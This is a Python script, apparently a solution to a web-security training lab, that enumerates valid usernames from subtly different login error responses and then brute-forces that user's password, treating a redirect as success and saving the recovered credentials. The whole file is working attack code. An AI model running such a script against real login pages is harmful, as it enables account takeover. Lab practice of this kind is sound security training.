############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 26/8/2023
#
# Lab: Username enumeration via subtly different responses
#
# Steps: 1. Obtain a valid username via subtly different error messages
#        2. Brute force password of that valid username
#
############################################################################

###########
# imports
###########
import requests
import re
import time
from colorama import Fore

#############################
# Global Variables
#############################
FAILED_USERS = []
FAILED_USERS_COUNTER = 0
FAILED_PASSWORDS = []
FAILED_PASSWORDS_COUNTER = 0


# change this to your lab URL
url = "https://0a85003b038f5b6682ba570200920076.web-security-academy.net/login"
# change the paths to your lists
usernames = open("/home/ahmed/users", 'rt').read().splitlines()
passwords = open("/home/ahmed/passwords",
                 'rt').read().splitlines()


#####################################
# Function to a pattern from a text
#####################################
def extract_pattern(pattern, text):
    exist = re.findall(pattern, text)
    if len(exist) != 0:
        return exist[0]
    else:
        return None


#####################################
# Function to print in a nice format
#####################################
def print_progress(elapsed_time, fail_counter, success_counter, total_counts, text):
    print(Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes || " + Fore.RED + "Failed: " + Fore.WHITE +
          str(fail_counter) + " || " + Fore.WHITE + f"Trying ({success_counter}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


#################################
# Function to get valid username
#################################
def get_valid_user(start_time, url, usernames):
    global FAILED_USERS
    global FAILED_USERS_COUNTER
    total_users = len(usernames)  # number of all usernames
    print(Fore.WHITE + "[#] Enumerate usernames..")
    for (index, user) in enumerate(usernames):
        data = {
            "username": user,
            "password": "not important"
        }
        # calculate elapsed time
        elapsed_time = (int((time.time() - start_time) / 60))
        # print the updated information
        print_progress(elapsed_time, FAILED_USERS_COUNTER,
                       index, total_users, user)
        try:  # try to send a login request
            res = requests.post(url, data)
            pattern1 = extract_pattern("<!-- -->", res.text)
            pattern2 = extract_pattern("password\.", res.text)
            # not every labs has the same compinations of these two patterns
            # adjust the next condition to your lab (e.g. pattern1 = some text & pattern2 = None )
            if pattern1 == None and pattern2 == None:
                return user
            else:
                pass
        except:
            FAILED_USERS_COUNTER += 1  # update the fail counter
            # save the failed username to try it later
            FAILED_USERS.append(user)
    None


##################################
# Function to bure force password
##################################
def brute_force_password(start_time, url, valid_user, passwords):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    print("")
    print(Fore.WHITE + "[#] Brute forcing password..")
    print(Fore.GREEN + "✅ Valid user: " + valid_user)
    total_passwords = len(passwords)  # number of all passwords
    for (index, password) in enumerate(passwords):
        # calculate elapsed time
        elapsed_time = (int((time.time() - start_time) / 60))
        print_progress(elapsed_time, FAILED_PASSWORDS_COUNTER,
                       index, total_passwords, password)
        # POST data to submit
        data = {
            "username": valid_user,
            "password": password
        }
        try:  # try to login
            response = requests.post(
                url, data, allow_redirects=False, timeout=5)
            if response.status_code == 302:  # valid password
                return password
            else:
                pass
        except:
            FAILED_PASSWORDS_COUNTER += 1  # update the failed counter
            # save the failed password to try it later
            FAILED_PASSWORDS.append(password)
    None


##################################
# Function to save results
##################################
def save_results(elapsed_time, file_name, valid_user, valid_password):
    global FAILED_USERS
    global FAILED_USERS_COUNTER
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    to_save = f"""
    ✅ Finished in: {elapsed_time} minutes \n\n\
    Username: {valid_user}, Password: {valid_password} \n\n\
    [!] Failed users count: {FAILED_USERS_COUNTER} \n\
    [!] Failed users: {FAILED_USERS} \n\n\
    [!] Failed passwords count: {FAILED_PASSWORDS_COUNTER} \n\
    [!] Failed passwords: {FAILED_PASSWORDS} \n\n"""
    try:
        new_file = open(file_name, "x")
        new_file.write(to_save)
        print(Fore.YELLOW + f"Results was saved to: {file_name}")
    except:
        print(Fore.RED + "Couldn't create the file to save results")


###############################
# Starting point of the script
###############################
start_time = time.time()  # capture the time before enumeration
valid_user = get_valid_user(
    start_time, url, usernames)  # start the enumeration

if valid_user != None:
    valid_password = brute_force_password(
        start_time, url, valid_user, passwords)
    if valid_password != None:  # if a valid password was found
        elapsed_time = int((time.time() - start_time) /
                           60)  # calculate elapsed time
        print("")
        print(Fore.GREEN + "✅ Login successfully: " + Fore.WHITE + " username: " +
              Fore.GREEN + valid_user + Fore.WHITE + ", password: " + Fore.GREEN + valid_password)
        print(Fore.GREEN + "✅ Finished in: " +
              Fore.WHITE + str(elapsed_time) + " minutes")
        save_results(elapsed_time, "results", valid_user, valid_password)
    else:  # no valid password was found
        elapsed_time = int((time.time() - start_time) /
                           60)  # calculate elapsed time
        print("")
        print(Fore.RED + "[!] Couldn't find a valid password")
        print(Fore.GREEN + "Finished in: " +
              Fore.WHITE + str(elapsed_time) + " minutes")
        save_results(elapsed_time, "results", valid_user, "")
else:
    elapsed_time = int((time.time() - start_time) /
                       60)  # calculate elapsed time
    print("")
    print(Fore.RED + "[!] Couldn't find a valid username")
    print(Fore.GREEN + "Finished in: " +
          Fore.WHITE + str(elapsed_time) + " minutes")
    save_results(elapsed_time, "results", "", "")


print(Fore.RED + "Failed users count: " +
      Fore.WHITE + str(FAILED_USERS_COUNTER))
print(Fore.RED + "Failed users: " + Fore.WHITE +
      "[ " + ", ".join(FAILED_USERS) + " ]")

print(Fore.RED + "Failed passwords count: " +
      Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
print(Fore.RED + "Failed passwords: " + Fore.WHITE +
      "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
